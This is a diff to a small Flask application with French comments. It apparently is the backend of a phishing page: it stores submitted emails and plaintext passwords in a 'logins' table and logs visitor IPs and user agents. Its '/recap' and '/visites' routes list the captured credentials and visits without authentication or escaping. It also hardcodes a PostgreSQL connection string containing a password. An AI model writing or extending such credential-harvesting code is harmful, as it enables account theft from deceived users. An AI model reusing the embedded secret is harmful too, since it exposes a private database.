@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, redirect, session
+from flask import Flask, request, render_template, redirect, session, render_template_string
 import psycopg2
 from psycopg2.extras import RealDictCursor
 from datetime import datetime
@@ -7,6 +7,7 @@ import os
 app = Flask(__name__)
 app.secret_key = "ceci_est_une_clé_secrète_à_modifier"
 
+# Remplace ici avec ton URL PostgreSQL Render
 DATABASE_URL = "postgresql://admin:wRGvLO4UKrNf7Uq7t0nbXoDTpKPkL4rJ@dpg-cvufunmuk2gs738bgifg-a.frankfurt-postgres.render.com/logins_pezw"
 
 def get_db():
@@ -88,14 +89,14 @@ def step2():
 def recap():
     with get_db() as conn:
         with conn.cursor() as c:
-            c.execute("SELECT timestamp, email, password FROM logins")
+            c.execute("SELECT timestamp, email, password FROM logins ORDER BY id DESC")
             rows = c.fetchall()
 
-    table_html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th></tr>"
+    html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th></tr>"
     for row in rows:
-        table_html += f"<tr><td>{row['timestamp']}</td><td>{row['email']}</td><td>{row['password']}</td></tr>"
-    table_html += "</table>"
-    return table_html
+        html += f"<tr><td>{row['timestamp']}</td><td>{row['email']}</td><td>{row['password']}</td></tr>"
+    html += "</table>"
+    return html
 
 @app.route("/visites", methods=["GET"])
 def visites():
@@ -104,11 +105,11 @@ def visites():
             c.execute("SELECT timestamp, ip, user_agent FROM visits ORDER BY id DESC LIMIT 50")
             rows = c.fetchall()
 
-    table_html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th></tr>"
+    html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th></tr>"
     for row in rows:
-        table_html += f"<tr><td>{row['timestamp']}</td><td>{row['ip']}</td><td>{row['user_agent']}</td></tr>"
-    table_html += "</table>"
-    return table_html
+        html += f"<tr><td>{row['timestamp']}</td><td>{row['ip']}</td><td>{row['user_agent']}</td></tr>"
+    html += "</table>"
+    return html
 
 if __name__ == "__main__":
     init_db()
